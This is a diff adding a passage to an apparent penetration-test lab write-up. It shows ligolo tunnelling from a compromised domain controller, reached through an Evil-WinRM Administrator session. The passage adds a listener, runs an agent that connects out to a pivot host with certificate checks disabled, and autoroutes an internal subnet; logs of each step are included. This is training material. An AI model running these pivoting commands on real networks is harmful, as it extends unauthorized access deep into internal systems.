@@ -2622,3 +2622,37 @@ Ethernet adapter Ethernet1:
    Default Gateway . . . . . . . . . : 172.16.9.1
 
 ```
+
+on kali a new listener is added on ligolo:
+
+```
+[Agent : srvadm@dmz01] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
+```
+
+on dc:
+
+```
+*Evil-WinRM* PS C:\Users\Administrator\Documents> .\agent.exe -connect 172.16.8.120:11601 -ignore-cert
+agent.exe : time="2026-11-15T08:34:22-08:00" level=warning msg="warning, certificate validation disabled"
+    + CategoryInfo          : NotSpecified: (time="2026-11-1...ation disabled":String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+time="2026-11-15T08:34:22-08:00" level=info msg="Connection established" addr="172.16.8.120:11601"
+
+```
+
+```
+[Agent : srvadm@dmz01] » INFO[0657] Agent joined.                                 id=0050568a9bb0 name="INLANEFREIGHT\\Administrator@DC01" remote="127.0.0.1:45122"
+[Agent : srvadm@dmz01] » session
+? Specify a session : 2 - INLANEFREIGHT\Administrator@DC01 - 127.0.0.1:45122 - 0050568a9bb0
+[Agent : INLANEFREIGHT\Administrator@DC01] » autoroute
+? Select routes to add: 172.16.9.3/23
+? Create a new interface or use an existing one? Create a new interface
+? Enter interface name (leave empty for random name): 
+INFO[0707] Generating a random interface name...        
+INFO[0707] Using interface name gameleatherhead         
+INFO[0707] Interface gameleatherhead configured (will be created on tunnel start) 
+INFO[0707] Creating routes for gameleatherhead...       
+? Start the tunnel? Yes
+INFO[0711] Starting tunnel to INLANEFREIGHT\Administrator@DC01 (0050568a9bb0) 
+
+```
